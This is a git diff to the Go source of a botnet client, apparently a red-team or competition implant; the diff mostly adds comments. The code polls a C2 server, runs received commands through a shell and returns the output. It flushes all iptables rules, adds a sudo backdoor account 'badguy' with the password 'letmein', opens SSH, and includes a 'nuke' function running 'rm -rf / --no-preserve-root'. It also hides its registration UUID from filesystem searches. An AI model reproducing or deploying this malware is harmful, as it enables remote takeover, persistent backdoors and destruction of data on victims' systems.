@@ -52,6 +52,7 @@ var OBFSEED = 5
 //OBFTEXT is the seed text that will get used for uuid obfuscation
 var OBFTEXT = "test"
 
+//blast payload out to C2, listen to response
 func sendData(data string, mode string, aid string) string {
 	payload := encodePayload(data, mode, aid)
 	fmt.Printf("sending: %s\n", payload)
@@ -79,6 +80,7 @@ func encodePayload(data string, mode string, aid string) string {
 	return fin
 }
 
+//decode from MAD into plaintext string
 func decodePayload(payload string) string {
 	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
 	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
@@ -90,6 +92,7 @@ func decodePayload(payload string) string {
 	return string(data)
 }
 
+//check if we've already registered
 func checkRegStatus() bool {
 	if _, err := os.Stat(REGFILE); os.IsNotExist(err) {
 		return false
@@ -97,6 +100,7 @@ func checkRegStatus() bool {
 	return true
 }
 
+//register the bot with the DB
 func register() string {
 	uid := uuid.New().String()
 	storeUUID(uid)
@@ -108,6 +112,7 @@ func register() string {
 	return ret
 }
 
+//pull all commands to be executed
 func getCommand() {
 	uid := fetchUUID()
 	coms := sendData(uid, "D", "0")
@@ -119,6 +124,7 @@ func getCommand() {
 	return
 }
 
+//split large string into individual commands/arguments
 func parseCommands(commandBlob string) []string {
 	results := []string{}
 	isplit := strings.Split(commandBlob, "<||>")
@@ -138,6 +144,7 @@ func parseCommands(commandBlob string) []string {
 	return results
 }
 
+//pass each action to appropriate handler
 func execCommand(mode string, args string) string {
 	retval := ""
 	switch mode {
@@ -173,12 +180,14 @@ func execCommand(mode string, args string) string {
 	return retval
 }
 
+//send output of all executed commands
 func sendResults(results []string) {
 	resStr := strings.Join(results, "<||>")
 	sendData(resStr, "E", "0")
 	return
 }
 
+//get IP of default interface, which the DB will use as hostname
 func getIP() string {
 	conn, _ := net.Dial("udp", "8.8.8.8:80")
 	defer conn.Close()
@@ -187,6 +196,7 @@ func getIP() string {
 	return ipStr
 }
 
+//write the UUID to somewhere on disk
 func storeUUID(uid string) {
 	obf := obfuscateUUID(uid, OBFSEED, OBFTEXT)
 	f, _ := os.Create(REGFILE)
@@ -195,13 +205,14 @@ func storeUUID(uid string) {
 	return
 }
 
+//grab the obfuscated UUID from somewhere on disk
 func fetchUUID() string {
 	obf, _ := ioutil.ReadFile(REGFILE)
 	deobf := deobfuscateUUID(string(obf))
 	return deobf
 }
 
-//modify it so you cant just search the filesystem for uuid formatted strings
+//simple obfuscation so you cant just search the filesystem for uuid formatted strings
 func obfuscateUUID(uid string, seed int, text string) string {
 	splituid := strings.Split(uid, "-")
 	l1 := strings.Repeat(text, rand.Intn(seed))
@@ -213,7 +224,7 @@ func obfuscateUUID(uid string, seed int, text string) string {
 	return obf
 }
 
-//undo those modifications
+//undo UUID obfuscations
 func deobfuscateUUID(obf string) string {
 	p := strings.Replace(obf, OBFTEXT, "", -1)
 	p = p[:8] + "-" + p[8:]
@@ -223,6 +234,7 @@ func deobfuscateUUID(obf string) string {
 	return p
 }
 
+//most commonly used, pass in args to a shell
 func shellExec(args string) string {
 	cmd := exec.Command("/bin/sh", "-c", args)
 	out, err := cmd.CombinedOutput()
@@ -232,6 +244,7 @@ func shellExec(args string) string {
 	return string(out)
 }
 
+//flush firewall rules from all tables
 func fwFlush() string {
 	cmd := exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
 	out, err := cmd.CombinedOutput()
@@ -241,6 +254,7 @@ func fwFlush() string {
 	return string(out)
 }
 
+//create a new user.  maybe in the future name/pass will be passed as args
 func createUser() string {
 	comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
 	if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
@@ -254,6 +268,7 @@ func createUser() string {
 	return string(out)
 }
 
+//allow ssh connections and restart the service
 func enableRemote() string {
 	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
 	insRule.Run()
@@ -265,12 +280,14 @@ func enableRemote() string {
 	return string(out)
 }
 
+//spawn a (disowned) reverse shell back to target IP/port
 func spawnRevShell(target string) string {
 	fmt.Println("In spawnRevShell")
 	//soon to come...
 	return ""
 }
 
+// probably never use this, but it's nice to have around :^)
 func nuke() string {
 	//rm rf dat boi
 	cmd := exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
@@ -278,16 +295,18 @@ func nuke() string {
 	return string(out)
 }
 
+//if the opcode is something weird, dont know what to do with it
 func unknownCom() string {
-	fmt.Println("In unknown")
 	return ""
 }
 
+//run everything
 func main() {
 	a := checkRegStatus()
 	if a {
 		getCommand()
 	} else {
 		register()
+		getCommand()
 	}
 }
